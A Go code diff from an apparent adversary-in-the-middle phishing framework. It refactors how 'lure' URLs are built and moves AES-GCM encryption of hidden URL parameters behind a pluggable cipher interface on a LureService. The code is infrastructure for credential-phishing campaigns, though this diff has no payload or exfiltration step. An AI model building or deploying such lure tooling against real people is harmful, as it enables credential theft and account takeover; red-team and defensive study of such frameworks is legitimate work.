@@ -1,13 +1,9 @@
 package aitm
 
 import (
-	"crypto/aes"
-	"crypto/cipher"
 	"crypto/rand"
 	"encoding/base64"
-	"errors"
 	"fmt"
-	"io"
 	"regexp"
 	"strings"
 	"time"
@@ -85,88 +81,22 @@ func (l *Lure) URL(httpsPort int) string {
 	return "https://" + host + l.Path
 }
 
-// URLWithParams returns the phishing URL with AES-256-GCM encrypted custom
-// parameters embedded as a base64url query value.
-func (l *Lure) URLWithParams(httpsPort int, params map[string]string) (string, error) {
-	base := l.URL(httpsPort)
-	if len(params) == 0 || len(l.ParamsKey) == 0 {
-		return base, nil
-	}
-	enc, err := encryptParams(l.ParamsKey, params)
-	if err != nil {
-		return "", err
-	}
-	return base + "?p=" + enc, nil
-}
-
-// DecryptParams decodes and decrypts the ?p= query value from a lure URL.
-func (l *Lure) DecryptParams(token string) (map[string]string, error) {
-	if len(l.ParamsKey) == 0 || token == "" {
-		return map[string]string{}, nil
-	}
-	return decryptParams(l.ParamsKey, token)
-}
-
-func encryptParams(key []byte, params map[string]string) (string, error) {
-	var sb strings.Builder
-	for key, value := range params {
-		sb.WriteString(key + "=" + value + "\n")
-	}
-	block, err := aes.NewCipher(key)
-	if err != nil {
-		return "", err
-	}
-	gcm, err := cipher.NewGCM(block)
-	if err != nil {
-		return "", err
-	}
-	nonce := make([]byte, gcm.NonceSize())
-	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
-		return "", err
-	}
-	ct := gcm.Seal(nonce, nonce, []byte(sb.String()), nil)
-	return base64.RawURLEncoding.EncodeToString(ct), nil
-}
-
-func decryptParams(key []byte, encoded string) (map[string]string, error) {
-	ct, err := base64.RawURLEncoding.DecodeString(encoded)
-	if err != nil {
-		return nil, err
-	}
-	block, err := aes.NewCipher(key)
-	if err != nil {
-		return nil, err
-	}
-	gcm, err := cipher.NewGCM(block)
-	if err != nil {
-		return nil, err
-	}
-	if len(ct) < gcm.NonceSize() {
-		return nil, errors.New("ciphertext too short")
-	}
-	plain, err := gcm.Open(nil, ct[:gcm.NonceSize()], ct[gcm.NonceSize():], nil)
-	if err != nil {
-		return nil, err
-	}
-	out := make(map[string]string)
-	for line := range strings.SplitSeq(string(plain), "\n") {
-		key, val, ok := strings.Cut(line, "=")
-		if ok {
-			out[key] = val
-		}
-	}
-	return out, nil
-}
-
 // lureInvalidator is called after any lure mutation to refresh caches.
 type lureInvalidator interface {
 	InvalidateLures()
+}
+
+// paramCipher provides authenticated encryption for lure URL parameters.
+type paramCipher interface {
+	Encrypt(key, plaintext []byte) ([]byte, error)
+	Decrypt(key, ciphertext []byte) ([]byte, error)
 }
 
 // LureService owns all business logic for lure management.
 type LureService struct {
 	Store       lureStore
 	Invalidator lureInvalidator
+	Cipher      paramCipher
 }
 
 func (s *LureService) Create(lure *Lure) error {
@@ -232,4 +162,45 @@ func (s *LureService) Unpause(id string) (*Lure, error) {
 	}
 	s.Invalidator.InvalidateLures()
 	return lure, nil
+}
+
+// URLWithParams returns the phishing URL with encrypted custom parameters
+// embedded as a base64url ?p= query value.
+func (s *LureService) URLWithParams(lure *Lure, httpsPort int, params map[string]string) (string, error) {
+	base := lure.URL(httpsPort)
+	if len(params) == 0 || len(lure.ParamsKey) == 0 {
+		return base, nil
+	}
+	var sb strings.Builder
+	for paramName, value := range params {
+		sb.WriteString(paramName + "=" + value + "\n")
+	}
+	ct, err := s.Cipher.Encrypt(lure.ParamsKey, []byte(sb.String()))
+	if err != nil {
+		return "", err
+	}
+	return base + "?p=" + base64.RawURLEncoding.EncodeToString(ct), nil
+}
+
+// DecryptParams decodes and decrypts the ?p= query value from a lure URL.
+func (s *LureService) DecryptParams(lure *Lure, token string) (map[string]string, error) {
+	if len(lure.ParamsKey) == 0 || token == "" {
+		return map[string]string{}, nil
+	}
+	ct, err := base64.RawURLEncoding.DecodeString(token)
+	if err != nil {
+		return nil, err
+	}
+	plain, err := s.Cipher.Decrypt(lure.ParamsKey, ct)
+	if err != nil {
+		return nil, err
+	}
+	out := make(map[string]string)
+	for line := range strings.SplitSeq(string(plain), "\n") {
+		paramName, val, ok := strings.Cut(line, "=")
+		if ok {
+			out[paramName] = val
+		}
+	}
+	return out, nil
 }
